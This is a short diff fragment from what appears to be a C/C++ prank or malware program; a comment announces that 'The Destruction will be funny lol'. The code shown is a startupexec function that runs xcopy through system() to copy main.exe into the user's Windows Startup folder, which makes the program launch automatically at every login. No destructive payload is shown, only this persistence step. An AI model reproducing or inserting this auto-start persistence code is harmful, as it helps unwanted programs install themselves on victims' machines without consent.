@@ -7,11 +7,8 @@
 //The Destruction will be funny lol
 
 //Made a Function startupexec to move it to startup folder
-
 void startupexec()
 {
     system("xcopy main.exe \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
     //copies main.exe to startup folder
 }
-
-
